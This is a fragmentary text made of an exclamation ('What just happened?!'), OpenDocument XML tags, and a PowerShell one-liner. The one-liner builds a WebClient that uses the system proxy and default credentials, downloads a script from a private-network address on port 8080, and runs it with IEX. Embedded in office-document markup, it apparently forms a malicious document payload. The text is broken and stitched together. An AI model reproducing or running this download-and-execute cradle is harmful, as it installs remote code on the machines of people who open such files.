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What just happened?!<office:text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Standard"/></office:text>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f=new-object net.webclient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){$f.proxy=[Net.WebRequest]::GetSystemWebProxy();$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;};IEX ((new-object Net.WebClient).DownloadString('http://192.168.68.8:8080/LWKDayQ1MHHTq')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